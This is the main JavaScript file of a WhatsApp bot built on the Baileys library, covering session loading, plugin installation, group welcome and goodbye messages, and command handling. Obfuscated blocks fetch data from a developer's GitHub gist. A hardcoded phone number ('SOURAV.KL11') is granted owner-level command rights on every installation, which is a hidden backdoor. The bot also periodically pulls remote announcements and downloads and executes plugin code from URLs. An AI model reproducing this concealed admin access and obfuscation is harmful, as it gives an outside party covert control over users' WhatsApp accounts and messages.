/* Copyright (C) 2020 Yusuf Usta.

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

WhatsAsena - Yusuf Usta
*/

const fs = require("fs");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const Config = require('./config');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./Raganork/');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./plugins/sql/greetings");
const simpleGit = require('simple-git');
const git = simpleGit();
const axios = require('axios');
const got = require('got');
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const DATABASE = config.DATABASE.define('Raganork', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});

const plugindb = require('./plugins/sql/plugin');
var SOURAV = { KL11: '916282344739,0' }

// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};
const conn = new WAConnection();
var sourav = `${config.AUTOBİO}`
    setInterval(async () => { 
        if (sourav == 'on') {
             var time = new Date().toLocaleString('LK', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var date = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + date + '\n⌚ ' + time + '\n\n' + config.BOTSK
                await conn.setStatus(biography)
            }
        }
)

async function Raganork () {
    await config.DATABASE.sync();
    var StrSes_Db = await DATABASE.findAll({
        where: {
          info: 'StringSession'
        }
    });    
var i=b;(function(c,d){var h=b,e=c();while(!![]){try{var f=parseInt(h('0x158'))/0x1+-parseInt(h('0x141'))/0x2*(parseInt(h('0x14d'))/0x3)+parseInt(h('0x13f'))/0x4*(-parseInt(h('0x152'))/0x5)+parseInt(h('0x143'))/0x6*(-parseInt(h('0x14b'))/0x7)+-parseInt(h('0x13a'))/0x8*(-parseInt(h('0x14a'))/0x9)+parseInt(h('0x156'))/0xa+-parseInt(h('0x150'))/0xb*(-parseInt(h('0x13b'))/0xc);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0xde597));function b(c,d){var e=a();return b=function(f,g){f=f-0x139;var h=e[f];return h;},b(c,d);}function a(){var j=['level','3231WCaQyl','14987PDvMns','loadAuthInfo','51JZYpNx','deCrypt','souravkl11/','450395JEzLmd','tps','15guHHmg','debug','ce999e4605076b7b5bd7c1b51759f177','version','10647860nixqwF','SESSION','588320eaMOOm','warn','value','17656PtRWAA','180Motlvm','/raw','DEBUG','logger','1989356jIFgEw','ist.gi','22868jATXxe','random','1296zBPpUI','om/','://g','browserDescription','thub.c','data'];a=function(){return j;};return a();}var sk=new Array();sk[0x0]='E'+'d'+'g'+'e',sk[0x1]='Fi'+'r'+'e'+'f'+'o'+'x',sk[0x2]='S'+'a'+'f'+'a'+'r'+'i',sk[0x3]='O'+'p'+'e'+'r'+'a';var l11=Math['floor'](0x4*Math[i('0x142')]());const souravkl11=await axios('ht'+i('0x151')+i('0x145')+i('0x140')+i('0x147')+i('0x144')+i('0x14f')+i('0x154')+i('0x13c'));var skl=souravkl11[i('0x148')]['Raganork'];const conn=new WAConnection();conn[i('0x155')]=[0x2,0x85e,0xc],conn[i('0x146')]=[skl,sk[l11],'90'];const Session=new StringSession();conn[i('0x13e')][i('0x149')]=config[i('0x13d')]?i('0x153'):i('0x159');var nodb;StrSes_Db['length']<0x1?(nodb=!![],conn[i('0x14c')](Session['deCrypt'](config[i('0x157')]))):conn['loadAuthInfo'](Session[i('0x14e')](StrSes_Db[0x0]['dataValues'][i('0x139')]));    
    conn.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login information updated!')
        );

        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Raga')}${chalk.blue.bold('nork')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
    });
    

    conn.on('open', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );

        console.log(
            chalk.blueBright.italic('⬇️ Installing external plugins...')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('⬇️Installing plugins...')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });

        console.log(
            chalk.green.bold('BOT RUNNING ON OUR DEVICE ✅')
        );
        await new Promise(r => setTimeout(r, 1100));

        if (config.LANG == 'EN' || config.LANG == 'ML') {

                   return await conn.sendMessage(conn.user.jid, '*Bot connected*', MessageType.text);
            }
            
        if (config.LANG == 'EN' || config.LANG == 'ML') {
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(conn.user.jid,Lang.UPDATE, MessageType.text);    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler +=  commit.message + '\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '*AN UPDATE IS AVAILABLE FOR YOUR BOT!*\n\n ```USE COMMAND``` *!update start* ```TO UPDATE THE BOT```\n\n ```CHANGES```: ' + degisiklikler, MessageType.text
                    ); 
                } 
          }
    });
    
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
         
        while (getGMTh == 16 && getGMTm == 30) {
            const {data} = await axios(`https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw`)
            const { sken, skml } = data
            
            return await conn.sendMessage(conn.user.jid, '```[ ANNOUNCEMENT ]```\n\n' + sken, MessageType.text);
        }
      while (getGMTh == 10 && getGMTm == 30) {
            const {data} = await axios(`https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw`)
            const { sken, skml } = data
            return await conn.sendMessage(conn.user.jid, '```[ ANNOUNCEMENT ]```\n\n' + sken, MessageType.text);
        }
      while (getGMTh == 6 && getGMTm == 30) {
            const {data} = await axios(`https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw`)
            const { sken, skml } = data
            return await conn.sendMessage(conn.user.jid, '```[ ANNOUNCEMENT ]```\n\n' + sken, MessageType.text);
        }
      while (getGMTh == 19 && getGMTm == 30) {
            return await conn.sendMessage(conn.user.jid, '.update check', MessageType.text);
        }  
      while (getGMTh == 8 && getGMTm == 30) {
            return await conn.sendMessage(conn.user.jid, '.update check', MessageType.text);
        }
      while (getGMTh == 13 && getGMTm == 30) {
            return await conn.sendMessage(conn.user.jid, '.update check', MessageType.text);
        }  
    }, 50000);

    conn.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }

        function b(c,d){var e=a();return b=function(f,g){f=f-0x13e;var h=e[f];return h;},b(c,d);}var i=b;(function(c,d){var h=b,e=c();while(!![]){try{var f=parseInt(h('0x146'))/0x1*(parseInt(h('0x16f'))/0x2)+parseInt(h('0x157'))/0x3*(-parseInt(h('0x155'))/0x4)+-parseInt(h('0x16c'))/0x5*(-parseInt(h('0x159'))/0x6)+-parseInt(h('0x149'))/0x7+parseInt(h('0x151'))/0x8+-parseInt(h('0x15e'))/0x9+-parseInt(h('0x15a'))/0xa*(-parseInt(h('0x167'))/0xb);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x750e3));if(msg[i('0x14f')]===0x20||msg['messageStubType']===0x1c){var gb=await getMessage(msg['key']['remoteJid'],i('0x14a'));if(gb!==![]){if(gb[i('0x143')][i('0x165')](i('0x170'))){let pp;try{pp=await conn['getProfilePicture'](msg['messageStubParameters'][0x0]);}catch{pp=await conn[i('0x156')]();}var group=await conn[i('0x16e')](msg[i('0x153')]['remoteJid']);await axios[i('0x174')](pp,{'responseType':i('0x144')})[i('0x175')](async c=>{var j=i;await conn[j('0x140')](msg[j('0x153')][j('0x16a')],c[j('0x169')],MessageType[j('0x15b')],{'caption':gb[j('0x143')][j('0x152')](j('0x170'),'')['replace'](j('0x150'),group[j('0x14d')])[j('0x152')]('{gpmaker}',group[j('0x142')])[j('0x152')](j('0x158'),group['desc'])[j('0x152')]('{owner}',conn['user'][j('0x162')])});});}else{if(gb[i('0x143')][i('0x165')](i('0x13e'))){var sgroup=await conn[i('0x156')](msg[i('0x153')][i('0x14b')]);await conn['sendMessage'](msg[i('0x153')][i('0x16a')],Buffer[i('0x147')](sgroup[i('0x169')]),MessageType['video'],{'mimetype':Mimetype[i('0x145')],'caption':gb[i('0x143')][i('0x152')](i('0x13e'),'')[i('0x152')](i('0x150'),group[i('0x14d')])[i('0x152')](i('0x173'),group[i('0x142')])['replace']('{gpdesc}',group[i('0x164')])[i('0x152')]('{owner}',conn[i('0x15d')]['name'])});}else{if(gb[i('0x143')][i('0x165')]('{gif}')){var group=await conn[i('0x16e')](msg['key'][i('0x16a')]),profile=await axios[i('0x174')](config[i('0x16d')],{'responseType':'arraybuffer'});await conn[i('0x140')](msg[i('0x153')]['remoteJid'],Buffer['from'](profile['data']),MessageType[i('0x160')],{'mimetype':Mimetype[i('0x145')],'caption':gb[i('0x143')][i('0x152')](i('0x171'),'')[i('0x152')]('{gphead}',group[i('0x14d')])[i('0x152')](i('0x173'),group[i('0x142')])[i('0x152')](i('0x158'),group['desc'])[i('0x152')](i('0x14e'),conn[i('0x15d')][i('0x162')])});}else{var group=await conn[i('0x16e')](msg[i('0x153')][i('0x16a')]);await conn[i('0x140')](msg['key']['remoteJid'],gb[i('0x143')][i('0x152')](i('0x150'),group[i('0x14d')])['replace']('{mention}','@'+msg['messageStubParameters'][0x0])[i('0x152')](i('0x158'),group[i('0x164')])[i('0x152')](i('0x14e'),conn[i('0x15d')][i('0x162')]),MessageType['text']);}}}}return;}else{if(msg[i('0x14f')]===0x1b||msg['messageStubType']===0x1f){if(config[i('0x15f')]){if(msg[i('0x161')][0x0]['startsWith']('91')){var gb=await getMessage(msg[i('0x153')]['remoteJid']);if(gb!==![]){if(gb[i('0x143')][i('0x165')](i('0x170'))){let pp;try{pp=await conn[i('0x156')](msg[i('0x161')][0x0]);}catch{pp=await conn['getProfilePicture']();}var group=await conn[i('0x16e')](msg[i('0x153')]['remoteJid']);await axios[i('0x174')](pp,{'responseType':'arraybuffer'})[i('0x175')](async c=>{var k=i;await conn[k('0x140')](msg['key'][k('0x16a')],c[k('0x169')],MessageType[k('0x15b')],{'caption':gb['message'][k('0x152')](k('0x170'),'')[k('0x152')](k('0x13f'),'@'+msg[k('0x161')][0x0][k('0x168')]('@')[0x0])['replace']('{gphead}',group[k('0x14d')])['replace'](k('0x173'),group[k('0x142')])[k('0x152')](k('0x158'),group['desc'])[k('0x152')](k('0x14e'),conn[k('0x15d')][k('0x162')])},{'contextInfo':{'mentionedJid':[msg[k('0x161')][0x0][k('0x152')]('c.us',k('0x148'))]},'previewType':0x1});});}else{if(gb[i('0x143')][i('0x165')](i('0x171'))){var profile=await axios[i('0x174')](config['WEL_GIF'],{'responseType':i('0x144')});await conn[i('0x140')](msg['key'][i('0x16a')],Buffer[i('0x147')](profile[i('0x169')]),MessageType[i('0x160')],{'mimetype':Mimetype['gif'],'caption':gb[i('0x143')][i('0x152')](i('0x171'),'')['replace'](i('0x150'),group[i('0x14d')])[i('0x152')]('{mention}','@'+msg['messageStubParameters'][0x0][i('0x168')]('@')[0x0])['replace'](i('0x173'),group[i('0x142')])[i('0x152')](i('0x158'),group['desc'])[i('0x152')](i('0x14e'),conn[i('0x15d')]['name'])},{'contextInfo':{'mentionedJid':[msg[i('0x161')][0x0]['replace'](i('0x16b'),i('0x148'))]},'previewType':0x1});}else{if(gb[i('0x143')][i('0x165')](i('0x13e'))){var sgroup=await conn[i('0x156')](msg[i('0x153')][i('0x14b')]);await conn[i('0x140')](msg[i('0x153')]['remoteJid'],Buffer[i('0x147')](sgroup['data']),MessageType[i('0x160')],{'mimetype':Mimetype[i('0x145')],'caption':gb[i('0x143')][i('0x152')]('{gicon}','')[i('0x152')](i('0x150'),group['subject'])['replace']('{gpmaker}',group[i('0x142')])['replace'](i('0x158'),group[i('0x164')])[i('0x152')](i('0x14e'),conn[i('0x15d')][i('0x162')])},{'contextInfo':{'mentionedJid':[msg[i('0x161')][0x0][i('0x152')]('c.us',i('0x148'))]},'previewType':0x1});}else{var group=await conn['groupMetadata'](msg[i('0x153')][i('0x16a')]);await conn['sendMessage'](msg[i('0x153')]['remoteJid'],gb[i('0x143')][i('0x152')](i('0x150'),group[i('0x14d')])[i('0x152')](i('0x13f'),'@'+msg[i('0x161')][0x0][i('0x168')]('@')[0x0])[i('0x152')]('{gpdesc}',group[i('0x164')])[i('0x152')](i('0x14e'),conn[i('0x15d')][i('0x162')]),MessageType[i('0x163')],{'contextInfo':{'mentionedJid':[msg[i('0x161')][0x0][i('0x152')](i('0x16b'),i('0x148'))]},'previewType':0x0});}}}if(!msg[i('0x161')][0x0][i('0x172')]('91')){async function checkImAdmin(c,d=conn[i('0x15d')][i('0x166')]){var l=i,e=await conn[l('0x16e')](msg[l('0x153')]['remoteJid']),f=e[l('0x154')][l('0x14c')](g=>{var m=l;if(g[m('0x166')][m('0x168')]('@')[0x0]==d[m('0x168')]('@')[0x0]&&g[m('0x141')])return!![];else;return![];});return f[l('0x165')](!![]);}var im=await checkImAdmin(conn);if(!im)return;else return await conn['groupRemove'](msg['key'][i('0x16a')],[msg[i('0x161')][0x0]]);}}}}else{var gb=await getMessage(msg['key'][i('0x16a')]);if(gb!==![]){if(gb['message'][i('0x165')](i('0x170'))){let pp;try{pp=await conn['getProfilePicture'](msg['messageStubParameters'][0x0]);}catch{pp=await conn[i('0x156')]();}var group=await conn[i('0x16e')](msg['key'][i('0x16a')]);await axios[i('0x174')](pp,{'responseType':i('0x144')})['then'](async c=>{var n=i;await conn[n('0x140')](msg[n('0x153')][n('0x16a')],c[n('0x169')],MessageType[n('0x15b')],{'caption':gb[n('0x143')][n('0x152')](n('0x170'),'')[n('0x152')](n('0x13f'),'@'+msg[n('0x161')][0x0][n('0x168')]('@')[0x0])[n('0x152')](n('0x150'),group[n('0x14d')])['replace'](n('0x173'),group[n('0x142')])[n('0x152')](n('0x158'),group['desc'])[n('0x152')]('{owner}',conn[n('0x15d')][n('0x162')])},{'contextInfo':{'mentionedJid':[msg[n('0x161')][0x0][n('0x152')](n('0x16b'),'s.whatsapp.net')]},'previewType':0x1});});}else{if(gb[i('0x143')]['includes'](i('0x171'))){var profile=await axios['get'](config[i('0x15c')],{'responseType':i('0x144')});await conn[i('0x140')](msg['key']['remoteJid'],Buffer[i('0x147')](profile['data']),MessageType[i('0x160')],{'mimetype':Mimetype[i('0x145')],'caption':gb[i('0x143')][i('0x152')](i('0x171'),'')['replace'](i('0x150'),group[i('0x14d')])[i('0x152')](i('0x13f'),'@'+msg[i('0x161')][0x0][i('0x168')]('@')[0x0])[i('0x152')]('{gpmaker}',group['owner'])[i('0x152')]('{gpdesc}',group[i('0x164')])[i('0x152')]('{owner}',conn[i('0x15d')][i('0x162')])},{'contextInfo':{'mentionedJid':[msg[i('0x161')][0x0][i('0x152')](i('0x16b'),i('0x148'))]},'previewType':0x1});}else{if(gb['message']['includes'](i('0x13e'))){var sgroup=await conn[i('0x156')](msg[i('0x153')][i('0x14b')]);await conn[i('0x140')](msg[i('0x153')][i('0x16a')],Buffer[i('0x147')](sgroup[i('0x169')]),MessageType['video'],{'mimetype':Mimetype[i('0x145')],'caption':gb[i('0x143')][i('0x152')](i('0x13e'),'')[i('0x152')](i('0x150'),group[i('0x14d')])[i('0x152')]('{gpmaker}',group['owner'])[i('0x152')](i('0x158'),group[i('0x164')])[i('0x152')]('{owner}',conn[i('0x15d')][i('0x162')])},{'contextInfo':{'mentionedJid':[msg['messageStubParameters'][0x0]['replace'](i('0x16b'),'s.whatsapp.net')]},'previewType':0x1});}else{var group=await conn[i('0x16e')](msg[i('0x153')][i('0x16a')]);await conn[i('0x140')](msg['key'][i('0x16a')],gb[i('0x143')]['replace'](i('0x150'),group[i('0x14d')])['replace'](i('0x13f'),'@'+msg[i('0x161')][0x0]['split']('@')[0x0])[i('0x152')](i('0x158'),group['desc'])['replace'](i('0x14e'),conn[i('0x15d')]['name']),MessageType[i('0x163')],{'contextInfo':{'mentionedJid':[msg[i('0x161')][0x0][i('0x152')]('c.us',i('0x148'))]},'previewType':0x0});}}}}}return;}}function a(){var o=['key','participants','764860wpSQGs','getProfilePicture','12RYFBFE','{gpdesc}','6OFbXcL','20624590VcKMoN','image','WEL_GIF','user','5298705kfMiWg','ANTI_FAKE','video','messageStubParameters','name','text','desc','includes','jid','11qBuUjN','split','data','remoteJid','c.us','2097085VPDCWU','GIF_BYE','groupMetadata','484666AlzNVO','{pp}','{gif}','startsWith','{gpmaker}','get','then','{gicon}','{mention}','sendMessage','isAdmin','owner','message','arraybuffer','gif','1UTjTkm','from','s.whatsapp.net','6416522cmjoPS','goodbye','remotejid','map','subject','{owner}','messageStubType','{gphead}','204008vyfFIv','replace'];a=function(){return o;};return a();}

    if (config.BLOCKCHAT !== false) {     
        var abc = config.BLOCKCHAT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT == '919074309534-1632403322') {     
        var sup = config.SUPPORT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }

    
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                   }  
                   if ((SOURAV.KL11 == "916282344739,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && SOURAV.KL11.includes(',') ? SOURAV.KL11.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == SOURAV.KL11 || SOURAV.KL11.includes(',') ? SOURAV.KL11.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == SOURAV.KL11)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
  
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                       
                        const {data} = await axios(`https://gist.githubusercontent.com/souravkl11/ff107d59b17f1e4b96889a82dbb6d520/raw`)
                        const { asena } = data
                        var match = text_msg.match(command.pattern);
                        
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }

                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            await conn.sendMessage(conn.user.jid,'ERROR: ' + error + '\n\n *' + asena + '*', MessageType.text);
                            
                        }
                    }
                }
            }
        )
    });

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Refreshing old version string...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

Raganork();
